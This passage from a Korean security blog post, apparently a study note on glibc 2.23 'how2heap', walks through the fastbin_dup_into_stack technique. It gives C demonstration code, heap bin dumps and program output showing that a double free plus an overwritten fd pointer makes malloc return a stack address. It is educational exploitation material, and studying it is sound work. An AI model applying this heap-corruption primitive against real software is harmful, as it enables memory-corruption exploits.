class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="built_in">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>fastbin_dup</code> 과 연계되는 내용이다. double free를 시키면 같은 bin에 같은 주소가 존재하게 되는데, 이 때 fd를 스택 주소로 덮으면 스택에 malloc이 할당되는 내용을 코드로 설명하고 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(0x20)     fastbin[0]: 0x603000 --&gt; 0x603020 --&gt; 0x603000 (overlap chunk with 0x603000(freed) )</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x603060 (size : 0x20fa0)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x0</span><br></pre></td></tr></table></figure>
+<p>free를 세 번 해주면 댜음처럼 bin에 chunk가 들어간다. 이 때 malloc을 한 번 하고 <code>d</code> 변수에 주소를 넣어주면, <code>d</code> 는 첫 번째 fastbin chunk를 가지고 있고, 한 번 더 할당해주면 두 번째 청크가 fastbin에서 나가고 다시 첫 번째 청크를 할당할 예정이 된다. 이 때 d를 스택주소로 바꾸게 되면, 그 첫 번쨰 청크의 fd는 스택주소를 가르키고 있기 때문에, 다시 할당해주면 그 땐 스택에 malloc을 할당하게 되고 스택 주소를 받을 수 있게 된다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(0x20)     fastbin[0]: 0x603000 --&gt; 0x7fffffffe588 --&gt; 0x603010 (size error (0x0))</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br></pre></td></tr></table></figure>
+<p>이런식으로 첫 번째 청크의 fd가 스택을 가르키고 있다. 여기서 두 번 malloc하게 되면 최종적으론 스택에 malloc하게 된다!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffe817eabc8.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x841010</span><br><span class="line">2nd malloc(8): 0x841030</span><br><span class="line">3rd malloc(8): 0x841050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x841010 again, things will crash because 0x841010 is at the top of the free list.</span><br><span class="line">So, instead, we&#x27;ll free 0x841030.</span><br><span class="line">Now, we can free 0x841010 again, since it&#x27;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x841010, 0x841030, 0x841010 ]. We&#x27;ll now carry out our attack by modifying data at 0x841010.</span><br><span class="line">1st malloc(8): 0x841010</span><br><span class="line">2nd malloc(8): 0x841030</span><br><span class="line">Now the free list has [ 0x841010 ].</span><br><span class="line">Now, we have access to 0x841010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x841010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x841010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffe817eabc8</span><br></pre></td></tr></table></figure>
+<p>최종적으로 malloc 했을 때 스택 주소가 리턴되는걸 볼 수 있다.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">1.</span> <span class="toc-text">fastbin dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-consolidate"><span class="toc-number">2.</span> <span class="toc-text">fastbin dup consolidate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-number">3.</span> <span class="toc-text">fastbin dup into stack</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&text=glibc 2.23 how2heap"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&is_video=false&description=glibc 2.23 how2heap"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=glibc 2.23 how2heap&body=Check out this article: http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&title=glibc 2.23 how2heap"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&name=glibc 2.23 how2heap&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.gosegu.kr/2023/05/07/glibc-2-23-how2heap/&t=glibc 2.23 how2heap"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    p0her
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
